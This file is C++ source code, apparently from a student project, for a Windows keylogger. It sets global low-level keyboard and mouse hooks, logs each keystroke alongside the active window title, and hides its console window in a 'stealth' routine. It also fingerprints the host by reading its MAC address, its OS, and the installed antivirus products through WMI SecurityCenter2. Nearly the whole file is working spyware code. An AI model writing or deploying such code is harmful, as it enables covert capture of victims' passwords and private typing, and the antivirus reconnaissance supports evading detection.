//
// KeyLogger.cpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/sources
//
// Made by Jeremy Thoveron
// Login   <jeremy.thoveron-@epitech.net>
//
// Started on  Fri Sep 29 16:21:07 2017 Jeremy Thoveron
// Last update Fri Sep 29 16:21:22 2017 Jeremy Thoveron
//

#include	"KeyLogger.hpp"
#include	<iphlpapi.h>
#include	<iomanip>
#include 	<comdef.h>
#include 	<Wbemidl.h>
#include	<atlbase.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "IPHLPAPI.lib")

HHOOK hookKeyboard;
HHOOK hookMouse;

WindowsKeyLogger::WindowsKeyLogger()
{
  this->capslock = false;
  this->shift = false;
}

WindowsKeyLogger::~WindowsKeyLogger()
{
}

void WindowsKeyLogger::stealth()
{
  HWND stealth;

  AllocConsole();
  stealth = FindWindow("KeyLoggerWindow", nullptr);
  ShowWindow(stealth, 0);
}

bool WindowsKeyLogger::check_upper()
{
  if (this->shift && this->capslock)
    return (false);
  else if (this->shift || this->capslock)
    return (true);
  else
    return (false);
}

void WindowsKeyLogger::initHooks()
{
  if (hookKeyboard)
    UnhookWindowsHookEx(hookKeyboard);
  hookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(handleKeyboard), nullptr, 0);
  if (hookMouse)
    UnhookWindowsHookEx(hookMouse);
  hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
}

void WindowsKeyLogger::unHooks()
{
  if (hookKeyboard)
    UnhookWindowsHookEx(hookKeyboard);
  if (hookMouse)
    UnhookWindowsHookEx(hookMouse);
}

void WindowsKeyLogger::getMacAddr()
{
  IP_ADAPTER_INFO	AdapterInfo[16];
  PIP_ADAPTER_INFO 	pAdapterInfo;
  DWORD  		buffer;
  DWORD			status;

  buffer = sizeof(AdapterInfo);
  status = GetAdaptersInfo(AdapterInfo, &buffer);
  if (status == ERROR_SUCCESS)
  {
    pAdapterInfo = AdapterInfo;
   std::cout  << std::hex << std::uppercase << std::setfill('0') <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[0]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[1]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[2]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[3]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[4]) << ":" <<
	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]) << std::endl;
  }
  else
  {
    std::cout << "Impossible to resolve the mac address" << std::endl;
  }
}

void	WindowsKeyLogger::getOperatingSystem()
{
#ifdef _WIN32
  std::cout << "Windows" << std::endl;
#endif
#ifdef _linux
  std::cout << "Linux" << std::endl;
#endif
}

void WindowsKeyLogger::getAntiVirus()
{
  HRESULT hres;
  IWbemLocator *locator = nullptr;
  IWbemServices *services = nullptr;
  IEnumWbemClassObject *pEnumerator = nullptr;
  IWbemClassObject *object = nullptr;
  ULONG uReturn = 0;

  hres = CoInitializeEx(nullptr, 0);
  if (FAILED(hres))
  {
    std::cerr << "Failed to initialize COM library" << std::endl;
    return ;
  }

  hres = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
  if (FAILED(hres))
  {
    std::cerr << "Failed to initialize security" << std::endl;
    return ;
  }

  hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, static_cast<LPVOID *>(&locator));
  if (FAILED(hres))
  {
    std::cerr << "Fail to to create IWbemLocator object" << std::endl;
    return ;
  }

  hres = locator->ConnectServer(_bstr_t(L"root\\SecurityCenter2"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services);
  if (FAILED(hres))
  {
    std::cerr << "Fail to connect" << std::endl;
    return ;
  }

  hres = CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
  if (FAILED(hres))
  {
    std::cerr << "Could not set proxy blanket" << std::endl;
    return ;
  }

  wchar_t *query = bstr_t("Select * From AntiVirusProduct");
  hres = services->ExecQuery(bstr_t("WQL"), bstr_t("Select * From AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);
  if (FAILED(hres))
  {
    std::cerr << "Query for antivirus name failed" << std::endl;
    return ;
  }

  while (pEnumerator)
  {
    pEnumerator->Next(WBEM_INFINITE, 1, &object, &uReturn);
    if (0 == uReturn)
    {
      break;
    }
    CComVariant cvtVersion;
    std::string	antivirus;
    object->Get(L"displayName", 0, &cvtVersion, 0, 0);
    antivirus = CW2A(cvtVersion.bstrVal);
    std::cout << antivirus << std::endl;
  }
  services->Release();
  locator->Release();
  pEnumerator->Release();
  CoUninitialize();
}

LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
{
  PKBDLLHOOKSTRUCT 	content;
  char 			tmp[0xFF] = {0};
  std::string 		str;
  DWORD 		msg;
  bool			shift;
  bool			capslock;
  short			value;
  char			windowTitle[512];
  HWND			windowForeground;

  windowForeground = GetForegroundWindow();
  GetWindowText(windowForeground, windowTitle, 512);
  shift = false;
  if (GetAsyncKeyState(VK_SHIFT))
    shift = true;
  value = GetKeyState(VK_CAPITAL);
  if ((value & 1) == 1)
    capslock = true;
  else
    capslock = false;
  msg = 1;
  if ((code == HC_ACTION) && wp == WM_SYSKEYUP || wp == WM_KEYUP)
  {
    content = reinterpret_cast<PKBDLLHOOKSTRUCT >(lp);
    if (content->vkCode == VK_SHIFT)
      shift = false;
  }
  if ((code == HC_ACTION) && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
  {
    content = reinterpret_cast<PKBDLLHOOKSTRUCT>(lp);
    msg += (content->scanCode << 16);
    msg += (content->flags << 24);
    GetKeyNameText(msg, tmp, 0xFF);
    str = static_cast<std::string>(tmp);
    if (str.length() <= 1)
    {
      if ((shift == true) ^ (capslock == true))
      {
	try
	{
	  str = WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
	}
	catch (std::out_of_range const &)
	{
	  str = toupper(str[0]);
	}
      }
      else
	str = tolower(str[0]);
      std::cout << str << " - " << windowTitle << std::endl;
    }
    else
    {
      try
      {
	str = WindowsKeyLogger::keys.at(content->vkCode);
	std::cout << str << " - " << windowTitle << std::endl;
      }
      catch (std::out_of_range const &)
      {
	std::cout << "NOT FOUND";
      }
    }
  }
  return CallNextHookEx(hookKeyboard, code, wp, lp);
}

LRESULT CALLBACK handleMouse(int code, WPARAM wp, LPARAM lp)
{
  MOUSEHOOKSTRUCT 	*mouseStruct;
  char			windowTitle[512];
  HWND			windowForeground;

  windowForeground = GetForegroundWindow();
  GetWindowText(windowForeground, windowTitle, 512);
  if (code == HC_ACTION)
  {
    mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lp);

  }
  return CallNextHookEx(hookMouse, code, wp, lp);
}